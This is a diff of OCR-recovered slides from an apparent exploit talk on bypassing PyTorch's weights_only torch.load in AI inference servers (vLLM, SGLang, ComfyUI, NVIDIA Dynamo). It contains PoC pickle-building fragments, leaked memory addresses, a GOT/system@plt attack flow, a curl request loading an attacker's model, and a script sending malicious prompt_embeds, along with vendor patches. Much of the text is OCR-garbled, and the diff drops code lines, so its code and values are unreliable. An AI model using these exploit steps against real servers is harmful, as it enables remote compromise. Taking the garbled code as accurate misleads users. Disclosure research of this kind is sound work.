-+10-18808 & (Viewed (CI
 list_obj.extend(items)
 elif key[0] == SETITEM[@]:
 (v, k) = (self.stack.pop(), self.stack.pop()
@@ -3317,7 +3112,6 @@ self._check_set_item_target("SETITEM")
 self.stack[-1] [k] = v
 elif key[0] == SETITEMS[0]:
 items = self.pop_mark()
-self._check_set_item_target ("SETITEMS")
 + def _check_set_item_target(self, opcode: str):
 + if type(self.stack[-1]) not in [dict, OrderedDict,
 Counter]:
@@ -3327,7 +3121,6 @@ collections.OrderedDict, "
 + f"collections.Counter, but got
 {type(self.stack[-1])}"
 + )
-db
 and
 torch.serialization._maybe_decode_ascii(pid[@]) != "storage"
 ):
@@ -3337,7 +3130,6 @@ allowed, but got|{type(pid[0])}"
 )
 self.append(self.persistent_load(pid) )
 elif key[0] in [BINGET[@], LONG_BINGET[Q]]:
-https://github.com/pytorch/pytorch/pull/1 70085
 98
 ```
 
@@ -3349,21 +3141,17 @@ https://github.com/pytorch/pytorch/pull/1 70085
 
 https://github.com/pytorch/pytorch/pull/165645/
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Change the Security Statement
-(IM 43% Closed
-Allcommits ~
 Q Filter files... —
-v ® docs/source/notes
 serialization.rst
-v G@ torch
 serialization.py
 (2) SECURITY.md
 Document limitations of weights_only in SECURITY.md and torch.load doc #165645
 mikaylagawarecki wants to merge 5 commits into gh/mikay lagawarecki/355/b.. from gh/mikaylagawarecki/355/... (O
-Y SECURITY.md (0) -?-
 33
 34
 35
@@ -3375,10 +3163,7 @@ in [this page] (https://developers.google.com/code-sandboxing).
 — **Be mindful of risky model formats**. Give preference to
 share and load weights with the appropriate format for your
 use case. [safetensors]
-(https: //huggingface.co/docs/safetensors/en/index) gives the
 most safety but is the most restricted in what it supports.
-[‘torch. load*]
-(https: //pytorch. org/docs/stable/generated/torch. load. html#tor
 ch. load) with ‘weights_only=True~ is also secure to our
 knowledge even though it offers significantly larger surface
 of attack. Loading un-trusted checkpoint with
@@ -3388,7 +3173,6 @@ of attack. Loading un-trusted checkpoint with
 35
 36
 0/3 viewed
-SBS @O
 Submit comments v
 environment such as a sandbox** (e.g., containers, virtual
 machines). This helps protect your system from potentially
@@ -3397,10 +3181,7 @@ in [this page] (https: //developers.google. com/code-sandboxing) .
 **Be mindful of risky model formats**. Give preference to
 share and load weights with the appropriate format for your
 use case. [safetensors]
-(https: //huggingface. co/docs/safetensors/en/index) gives the
 most safety but is the most restricted in what it supports.
-[* torch. load*]
-(https: //pytorch. org/docs/stable/generated/torch. load. html#tor
 ch.load) has a significantly larger surface of attack but is
 more flexible in what it can serialize. See the documentation
 for more details.
@@ -3418,7 +3199,8 @@ https://github.com/pytorch/pytorch/pull/165645/
 
 100
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Final Fix
@@ -3454,7 +3236,8 @@ One Chain, All Owned
 
 https://docs.vllm.ai/en/latest/features/prompt_embeds/
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Motivation Behind This Feature
@@ -3479,7 +3262,8 @@ https://docs.vllm.ai/en/latest/features/prompt_embeds/
 
 https://docs.nvidia.com/nim/large-language-models/latest/advanced-use-cases/prompt-embeds.html
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Motivation Behind This Feature
@@ -3508,16 +3292,15 @@ https://docs.nvidia.com/nim/large-language-models/latest/advanced-use-cases/prom
 
 105
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 a
 Other Affected Components
-| | IV] tL) OpenLLM
 Al Inference
 NVIDIA Dynamo
 Scale and Serve Generative Al, Fast. Gs
-*SGL
 105
 ```
 
@@ -3527,11 +3310,11 @@ Scale and Serve Generative Al, Fast. Gs
 
 106
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “What is OpenLLM?
-C) OpenLLM
 é» OpenLLM: Self-Hosting LLMs Made Easy
 OpenLLM allows developers to run any open-source LLMs (Llama 3.3, Qwen2.5, Phi3 and more) or
 custom models as OpenAl-compatible APIs with a single command. It features a built-in chat Ul, state-
@@ -3549,7 +3332,8 @@ Understand the design philosophy of OpenLLM.
 
 https://github.com/bentoml/openllm-models
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Configuration
@@ -3588,20 +3372,18 @@ https://github.com/bentoml/openllm-models
 
 108
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Architecture
 OpenLLM
 OpenLLM CLI + BentoML + openllm-models
 packaging / config / deployment
-piersparent proxy
-Va
 vLLM OpenAl-Compatible Server
 vilm.entrypoints.openai.api_server
 /v1/chat/completions /v1/completions
 [ /vi/embeddings | /v1/models
-.
 108
 ```
 
@@ -3611,20 +3393,18 @@ vilm.entrypoints.openai.api_server
 
 109
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-a °
 Source -> Sink
 HTTP POST /v1/chat/completions
 payload: {"type": “image_embeds", "“image_embeds": "<base64-data>"}
 |
 |
-i api_server. py: 466 create_chat_completion(request, raw_request)
 |
 — serving_chat.py:121 create_chat_completion()
 | L line 183: self._preprocess_chat(...)
-[+ serving_engine. py: 403 _preprocess_chat()
 | L parse_chat_messages_futures(messages, ...)
 |
 [+ chat_utils.py:1155 parse_chat_messages_futures()
@@ -3637,14 +3417,12 @@ i api_server. py: 466 create_chat_completion(request, raw_request)
 | L line 989: _parse_chat_message_content_part(part, ...)
 — chat_utils.py:1010 _parse_chat_message_content_part()
 | L line 1048-1051: if part_type == "image_embeds":
-| mm_parser.parse_image_embeds (content)
 |
 — chat_utils.py:749 AsyncMultiModalContentParser.parse_image_embeds()
 | L self._connector. fetch_image_embedding(image_embeds_str)
 — multimodal/utils.py:245 MediaConnector.fetch_image_embedding(data)
 | L ImageEmbeddingMediaI0().load_base64(""", data)
 |
-|» multimodal/image.py:72 load_base64(media_type, data)
 | L self. load_bytes (base64.b64decode(data) )
 |
 Ly multimodal/image.py:67-68 load_bytes(data) 109
@@ -3657,7 +3435,8 @@ L torch. load(BytesI0(data), weights_only=True)
 
 110
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “What is SGLang?
@@ -3676,10 +3455,10 @@ distributed clusters. Its core features include:
 
 111
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-a e
 Source -> Sink
 @app.post("/update_weights_from_disk") @dataclass
 @auth_level(AuthLevel. ADMIN_OPTIONAL) klass UpdateWeightFromDiskReqInput (BaseReq)
@@ -3693,9 +3472,7 @@ num_paused_requests, abort_all_requests: bool = False
 if not is_local:
 hf_folder = download_weights_from_hf (
 model_name_or_path,
-self. load_config.download_dir,
 allow_patterns,
-. . : . revision,
 def _load_pt_file(bin_file: str) -> dict:
 """load a PyTorch checkpoint file, handling legacy tar format. ignore_patterns=self. load_config. ignore_patterns,
 PyTorch 2.6 changed the default of weights_only from False to True.
@@ -3715,7 +3492,8 @@ return torch. load(bin_file, map_location="cpu", weights_only=True)
 
 https://docs.sglang.io/docs/basic_usage/native_api
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ‘Motivation Behind This Feature
@@ -3742,7 +3520,8 @@ https://docs.sglang.io/docs/basic_usage/native_api
 
 113
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 "Crash? Why?
@@ -3751,7 +3530,6 @@ python -m sglang. launch_server curl -s http://localhost:30000/update_weights_fr
 -d '{"model_path":"{{evil_model_on_hf}}",
 "flush_cache":true}'
 return torch.load(bin_file, map_location="cpu", weights_only=True)
-AAA AARAA AAR AR AAR AA AAA AAAA RAR AAR AARA AAA AAR AARAAAARARAARAAAAR
 File "/home/. |/Desktop/(G."..8l" Sia" venv/lib/python3.12/site-packages/torch/serialization.py", line 1529, in load
 raise pickle.UnpicklingError(_get_wo_message(str(e))) from None
 _pickle.UnpicklingError: Weights only load failed. In PyTorch 2.6, we changed the default value of the ‘weights_only* argument in ‘torch.load* from ‘False* to ‘T:
@@ -3777,7 +3555,8 @@ Killed
 
 114
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "The Difference
@@ -3800,11 +3579,9 @@ _ Scheduler receives SIGQUIT
 except Exception as e: #UnpicklingError IS a subclass of Exception v
 raise HTTPException(status_code=HTTPStatus. INTERNAL_SERVER_ERROR. value, Kills entire process tree x
 detail=str(e)) from e
-@app. exception_handler(HTTPException)
 async def http_exception_handler(_: Request, exc: HTTPException):
 err = ErrorResponse(
 error=ErrorInfo(message=exc.detail,
-type=HTTPStatus(exc.status_code).phrase,
 code=exc.status_code) )
 return JSONResponse(err.model_dump(), status_code=exc.status_code)
 114
@@ -3822,7 +3599,8 @@ return JSONResponse(err.model_dump(), status_code=exc.status_code)
 
 116
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Upgrade PyTorch Version to Resolve This Issue
@@ -3834,10 +3612,8 @@ Code Blame Executable File + 231 lines (211 lo
 78 “torchaudio==2.11.0",
 79 "torchcodec==0.11.1 ; sys_platform != 'li
 80 "torchvision",
-81 "“tqdm",
 82 "transformers==5.12.1",
 83 “uvicorn",
-84 “uv loop",
 85 "watchfiles",
 86 "xgrammar==0.2.1",
 87 "zstandard",
@@ -3851,11 +3627,11 @@ Code Blame Executable File + 231 lines (211 lo
 
 117
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “What is ComfyUI?
-ComfyUIl
 The most powerful and modular visual Al engine and application.
 X Follow @ComfyUI
 downloads@latest 9K}
@@ -3871,7 +3647,8 @@ release date last monday § downloads 3.8M |
 
 118
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Demo Web Page
@@ -3883,10 +3660,6 @@ randomize
 8.0
 © cig
 text, watermark
-MODEL ¢ IL
-‘cwe7
-ae
-VAE @
 v1-S-pruned-emaonly.safete... >
 ```
 
@@ -3898,23 +3671,18 @@ v1-S-pruned-emaonly.safete... >
 
 https://comfyui-wiki.com/en/comfyui-nodes/loaders/checkpoint-loader-simple
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-|
-i
 Feature
 nglish interface XRD
 Load Checkpoint Checkpointil®#
 MODEL @
 CLIP @
 VAE @
-v1-5-pruned.safetensors >
-RR e
 CLIP @
 VAE @
-<q Checkpoint&* ~=v1-5-pruned.safetensors >»
-<4 ckpt_name
 Load Checkpoint | Checkpointhh#tzs (2)
 Documentation
 e Class name: CheckpointLoaderSimple
@@ -3933,7 +3701,8 @@ https://comfyui-wiki.com/en/comfyui-nodes/loaders/checkpoint-loader-simple
 
 120
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "The Vuln
@@ -3941,7 +3710,6 @@ class CheckpointLoaderSimple:
 def load_checkpoint(self, ckpt_name):
 ckpt_path = folder_paths.get_full_path_or_raise("checkpoints", ckpt_name)
 out = comfy.sd.|load_checkpoint_guess_config(ckpt_path, output_vae=True,
-output_clip=True, embedding_directory=folder_paths.get_folder_paths ("embeddings") )
 return out[:3]
 def load_checkpoint_guess_config(ckpt_path, ...):
 sd, metadata = comfy.utils; load_torch_file(ckpt_path, return_metadata=True)
@@ -3964,13 +3732,13 @@ pl_sd =|torch.load(ckpt, map_location=device, weights_only=True, *ktorch_args) 1
 
 121
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 “Leak Achieved
 Unsaved Workflow @
 overflow_length = 256
-poc = generate_overflow_tensor_pid(overflow_lLength, 2)
 poc += TUPLE1+BINPERSID
 poc += STOP
 Am
@@ -3990,11 +3758,9 @@ Only persistent_load of storage is allowed, but got tensor([ 1, 2, 3,
 136375604260568, 4294967298, 136368500026816,
 136374743898800, 136368500026816, 3537586595450322688,
 2048, 432345564227567616, 0, _
-107528539012448, 136368584941536, 0, . ft we : we
 136370543981344, 37, 136369506615296, [+] Upload success: {'name': 'pwn_fjwolf.ckpt', 'subfolder': ‘check
 136368499982480, 0, 37, points', 'type': ‘output'}
 136373801582592, 136368499982480, 0, [+] Triggering checkpoint load...
-37, 136378096549888, 136368499982480, x : .
 0, 37, 136382391517184, [+] Trigger response: 200
 136368499982480, 0, 37, [+] Response: {"prompt_id": "6d283cc8-9399-42ce—a769—fe8056e53764",
 136386686484480, 136368499982480, 0, "number": @, "node_errors": {}}
@@ -4015,14 +3781,14 @@ Only persistent_load of storage is allowed, but got tensor([ 1, 2, 3,
 
 122
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Attack Flow
 ROUND 1 ROUND 2
 Leak libtorch_python.so Leak libtorch_cpu.so
 e The vptr of StorageImpl > libtorch_python.so e Modify data_ —GOTin libtorch_python.so > libtorch_cpu.so
-—=
 e Do not need to modify anything e Modify deleter_ — ret gadget
 X No system@plt in libtorch_python.so Y libtorch_cpu.so has system@plt
 v
@@ -4046,7 +3812,8 @@ Not affected after PyTorch released the fixed version
 
 124
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 " Auto-Download Latest Version
@@ -4055,14 +3822,12 @@ ComfyUI / requirements.txt (9
 , comfyanonymous Fix black image on turing when using int4 models. (#14864) xX
 Code Blame 37 lines (36 loc) - 531 Bytes : ©
 1 comfyui-f rontend—-package==1.45.20
-2 comf yui-workf lLow—temp Lates==0.11.6
 3 comfyui-—embedded-docs==0.5.7
 4 torch
 5 torchsde
 6 torchvision
 7 torchaudio
 8
-numpy>=1.25.0
 124
 ```
 
@@ -4072,7 +3837,8 @@ numpy>=1.25.0
 
 125
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Pwn2Own 2026
@@ -4086,7 +3852,6 @@ Database $40,000 Ollama $40,000
 Megatron Bridge $20,000
 LiteLLM $40,000
 NV Container Toolkit $50,000
-ai . sino Dynamo $50,000
 Anthropic Claude Code $40,000 sii
 OpenAl Codex $40,000
 Cursor $30,000 125
@@ -4098,7 +3863,8 @@ Cursor $30,000 125
 
 126
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “What is Dynamo?
@@ -4117,7 +3883,8 @@ multi-node distributed environments.
 
 127
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Started Bug Hunting on Announcement Day
@@ -4126,7 +3893,6 @@ Announcing #Pwn2Own Berlin 2026! We've got 10 categories for targets,
 including an expanded #A\ target list. We have 4 Al categories - including
 coding agents (looking at you #Claude). More than $1,000,000 in cash &
 prizes available. Read the details at
-_ zerodayinitiative.com
 a) Zero Day Initiative — Announcing Pwn2Own Berlin ...
 a = If you just want to read the contest rules, click here .
 ag ee Willkommen zuriick, meine Damen und Herren, zu...
@@ -4145,7 +3911,8 @@ Release Notes
 
 128
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Three Backends
@@ -4173,7 +3940,8 @@ Tool Calling
 
 129
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Try to Deploy
@@ -4183,15 +3951,6 @@ docker run —-gpus all -—-network host —-rm —it nvcr.io/nvidia/ai—dynam
 docker run —-gpus all —-network host -—-rm -it nvcr.io/nvidia/ai—dynamo/tensorrtllm-runtime:0.9.
 # vLLM
 docker run —-gpus all —-network host --rm —it nvcr.io/nvidia/ai—dynamo/vllm-runtime:0.9.1
-COELLOOEE 00Ge COLE ELLE LLCOELCE icrcicic) ciciclcic)
-OOLLOOLLOOEEE LOCO OLLOE CLOOE COLLCOEELOEOLE CLCOE COELLOE
-OOLLOOLLOOOLEE CLOOLE CLLOEE COLLE CELLOOLLOOLEEOO COOLE OLLLOOELE
-eeeCe COLLOOELEOOE OLLOEE COELE ELLOO COLLE ELLCE  OLLLE CLOCOE
-OLCOE OLOOL ELOELOELOLE  OLOEOE CLOLE OLLOE OLCOE COEOLE LLLOLE
-eeeee OOLLE COOLLCOEECE  COOEE EOLLOE COLELLO CLOEOE OOLLOOELOOEEE
-eeeCe OLLLOE COOLCOEOEE OLOOL CLOLCOLLOLOELE COLLO COLEELOELOEEOLE
-eeeee OEGLCE LELLLOE OOLLE CLCOLLCOELLOE COLLEOEELOE OLCCOE
-crcl) crcl) eeee COG = ELLLOEE (CCC) eee ©
 Dynamo: A Datacenter Scale Distributed Inference Serving Framework
 This is a minimum runtime container for interacting with Dynamo via our CLI
 tools.
@@ -4212,7 +3971,8 @@ cases, you can start them in the container as well:
 
 130
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Errors When Run Directly
@@ -4225,23 +3985,17 @@ File "<frozen runpy>", line 88, in _run_code
 File "/opt/dynamo/venv/lib/python3.12/site-packages/dynamo/frontend/__main__.py", line 7, in <module>
 main()
 File "/opt/dynamo/venv/lib/python3.12/site-packages/dynamo/frontend/main.py", line 464, in main
-uvloop.run(async_main() )
 File "/opt/dynamo/venv/1lib/python3.12/site-packages/uvloop/__init__.py", line 109, in run
 return __asyncio.run(
-AAAAAAAARAAAARA
 File "/usr/lib/python3.12/asyncio/runners.py", line 194, in run
 return runner.run(main)
-AAAAKAAAAAAAARAANR
 File "/usr/lib/python3.12/asyncio/runners.py", line 118, in run
 return self._loop.run_until_complete(task)
-ANRAAAAARARARARARARARARARARAAARARARARARRN
 File "uvloop/loop.pyx", line 1518, in uvloop.loop.Loop.run_until_complete
 File "/opt/dynamo/venv/lib/python3.12/site-packages/uvloop/__init__.py", line 61, in wrapper
 return await main
-AAAAAAARAN
 File "/opt/dynamo/venv/lib/python3.12/site-packages/dynamo/frontend/main.py", line 371, in async_main
 runtime = DistributedRuntime(loop, flags.store_kv, flags.request_plane, enable_nats)
-A RA ARARARRAARARARAARAARARARRARARARAARR AA ARARARRARARAARARRARAARARAARARAARRAN
 Exception: Unable to create lease. Check etcd server status at http://localhost:2379
 130
 ```
@@ -4252,18 +4006,16 @@ Exception: Unable to create lease. Check etcd server status at http://localhost:
 
 131
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Deploy Successfully
 nats-server -js &
 etcd --listen-client-urls http://@.0.0.0:2379
---advertise-client-urls http://0.0.@.0:2379
 -—-data-dir /tmp/etcd &
 python -m dynamo.frontend &
 python -m dynamo.vllm --model Qwen/Qwen3-2@.6B
-Lepe v a prerepereres coo Lagicn -
-dynamo@gpu-v100: /workspace$ python -m dynamo. frontend
 INFO Initializing KV store discovery backend
 INFO Initializing NetworkManager with TCP request plane mode=tcp host=192.
 168.1.9 port-OS-assigned
@@ -4292,19 +4044,17 @@ INFO added_model_model_name="Qwen/Qwen3-@.6B"_namespace="dynamo" 131
 
 132
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Architecture
 vLLM Native NVIDIA Dynamo
 Client Client
-| u
 Dynamo Frontend
 HTTP Server ,
 Python - FastAPI - uvicorn HTTP Server
 Rust - Axum - Tokio
-4 AsyncLLM Engine = (eel Top. |-------------
-} 4
 vLLM Worker (Python)
 All in one Python process rene Bae + AsyncLLM Engine
 Frontend & Worker are separate processes
@@ -4318,7 +4068,8 @@ GPU Inference Core
 
 133
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "The Vuln
@@ -4352,7 +4103,8 @@ weights_only=True ¥
 
 134
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 “Leak Achieved
@@ -4368,11 +4120,7 @@ content=base64. b64encode(f.read()).decode()
 data = {
 }
 response = requests.post(url, headers=headers,
-"model": "Qwen/Qwen3-0@.6B",
 "prompt": x",
-"prompt_embeds":content,
-"stream":False
-print (response. text)
 ‘dynamo@iv-yeqdbeqém8ay8n848rzF: /tmp/exp$ python3 send.py ]
 {"message":"Failed to fold completions stream for @cd43495-4ceb-4491-aa19-f6af16@a8e96: unknown variant “error: Invalid
 prompt_embeds: Failed to decode prompt_embeds as PyTorch tensor: Weights only load failed. In PyTorch 2.6, we changed th
@@ -4397,7 +4145,6 @@ Please file an issue with the following so that we can make ‘weights_only=True
 Only persistent_load of storage is allowed, but got tensor({ 1, 2, 3,
 10, 9, 97,
 322170851, 4285345213156097082, 110425377238528,
-@, @1)
 Check the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.
 ERROR Failed to process prompt_embeds for request @cd43495-4ceb-4491-aa19-féaf160a8e96: Failed to decode prom
 ly load failed. In PyTorch 2.6, we changed the default value of the ‘weights_only’ argument in ‘torch.load’ from ‘False’ to ‘True’. Re-running ‘torch.load* with ‘weights_only
@@ -4407,7 +4154,6 @@ Please file an issue with the following so that we can make ‘weights_only=True
 Only persistent_load of storage is allowed, but got tensor({ 1, 2, 3,
 10, 9, 97,
 322170851, 4285345213156097082, 110425377238528,
-e, @1)
 a the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.
 134
 ```
@@ -4422,7 +4168,8 @@ a the documentation of torch.load to learn more about types accepted by default 
 
 136
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 ~ — dynamo@iv-yeqdb0q6m8ay8n848rzf: jworkspace — ssh root@118.196.114.94 dynamo@iv-yeqdb0qém8ay8n848rzf: /workspace — ssh root@118.196.114.94 +
@@ -4493,7 +4240,8 @@ INFO Registered endpoint 'generate' with shared TCP server on 172.31.2.19:44251
 
 https://www.zerodayinitiative.com/blog/2026/5/13/pwn2own-berlin-2026-the-full-schedule
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “This Target Remains Unchallenged
@@ -4517,7 +4265,8 @@ https://www.zerodayinitiative.com/blog/2026/5/13/pwn2own-berlin-2026-the-full-sc
 
 https://github.com/ai-dynamo/dynamo/pull/8248/changes
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 a
@@ -4525,7 +4274,6 @@ a @@ -1351,6 +1351,22 @@ def _build_prompt_from_request (
 1351 embedding_sequence_length = None
 1352
 1353 if “prompt_embeds" in request and
-request ["prompt_embeds"] :
 1354 trv:
 1351
 1352
@@ -4567,15 +4315,9 @@ None
 {
 prompt_embeds: {msg}",
 trv:
-i,
 rror(
-,
-,
-® & (OO Viewed
-va]
 “finish_reason": f"error: Invalid
 “token_ids":
-o,
 https://github.com/ai-dynamo/dynamo/pull/8248/changes
 138
 ```
@@ -4588,7 +4330,8 @@ https://github.com/ai-dynamo/dynamo/pull/8248/changes
 
 https://github.com/ai-dynamo/dynamo/pull/8228/changes
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 a
@@ -4618,12 +4361,10 @@ embeddings_tensor = torch. load(buffer,
 weights_only=True)
 # Step 3: Validate it's a tensor
 if not isinstance(embeddings_tensor,
-torch. Tensor):
 raise ValueError(
 f"prompt_embeds must be a torch.Tensor,
 got {type(embeddings_tensor) }"
 )
-logger. debug (
 f"Decoded PyTorch format embeddings: shape=
 {embeddings_tensor.shape}, "
 f"dtype={embeddings_tensor.dtype}, size=
@@ -4665,7 +4406,8 @@ https://github.com/ai-dynamo/dynamo/pull/8228/changes
 
 141
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 a
